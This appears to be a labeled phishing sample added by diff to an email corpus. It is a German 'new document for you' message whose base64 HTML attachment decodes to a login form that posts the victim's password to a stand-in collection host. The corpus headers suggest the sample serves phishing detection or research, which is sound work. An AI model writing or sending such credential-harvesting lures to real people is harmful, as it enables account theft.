@@ -1,0 +1,25 @@
+X-Corpus-Class: phishing
+X-Corpus-Lang: de
+X-Corpus-Auth: spf=none dkim=none dmarc=none
+X-Corpus-Sender: unknown
+X-Corpus-Note: login page as HTML attachment
+From: Scan Service <scanner@docs-share.example>
+To: Max Muster <max@uwu.example>
+Subject: =?utf-8?q?Neues_Dokument_f=C3=BCr_Sie?=
+Date: Tue, 15 Sep 2026 05:07:00 +0000
+Message-ID: <070970746692.963@docs-share.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="mix-3518254682"
+
+--mix-3518254682
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+Öffnen Sie das angehängte Dokument und melden Sie sich an, um es anzusehen.
+--mix-3518254682
+Content-Type: text/html; name="Dokument.html"
+Content-Disposition: attachment; filename="Dokument.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGZvcm0gYWN0aW9uPSdodHRwczovL2NvbGxlY3QuZXhhbXBsZS9wJz48aW5wdXQgbmFtZT0ncGFzc3dvcmQnPjwvZm9ybT48L2h0bWw+
+--mix-3518254682--
